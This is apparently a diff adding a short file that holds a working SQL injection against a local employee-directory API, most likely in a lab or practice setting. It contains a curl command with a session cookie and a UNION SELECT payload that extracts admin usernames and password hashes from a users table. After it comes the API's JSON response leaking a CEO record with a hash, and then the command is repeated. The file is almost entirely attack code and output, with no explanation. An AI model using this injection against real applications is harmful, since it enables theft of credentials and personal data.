@@ -1,0 +1,10 @@
+curl -G 'http://127.0.0.1:5000/api/v1/employees' \
+        --cookie 'session=eyJfY3NyZiI6ImU3NGEwZWEwMDYyZDZhOTIzOGRkZjk3NTg5MjkyNGFmIiwiZXBvY2giOjAsInByZXZfbG9naW4iOm51bGwsInVzZXJfaWQiOjE1fQ.avMxog.dKoUn6iAvvzUBLHhGI2kuNiT5nQ' \
+        --data-urlencode "q=') AND 0 UNION ALL SELECT id,username,password_hash,email,title,department,phone,office,manager_id FROM users WHERE role='admin'--"
+[{"department":"Executive","email":"pprice@e-corp.com","full_name":"eb9e37f9e222f5e9ccd49d0ccbd18aab","id":1,"manager_id":null,"office":"Floor 62, Corner Office","phone":"+1 212 555 0100","title":"Chief Executive Officer","username":"pprice"}]
+
+
+
+curl -G 'http://127.0.0.1:5000/api/v1/employees' \
+        --cookie 'session=eyJfY3NyZiI6ImU3NGEwZWEwMDYyZDZhOTIzOGRkZjk3NTg5MjkyNGFmIiwiZXBvY2giOjAsInByZXZfbG9naW4iOm51bGwsInVzZXJfaWQiOjE1fQ.avMxog.dKoUn6iAvvzUBLHhGI2kuNiT5nQ' \
+        --data-urlencode "q=') AND 0 UNION ALL SELECT id,username,password_hash,email,title,department,phone,office,manager_id FROM users WHERE role='admin'--"
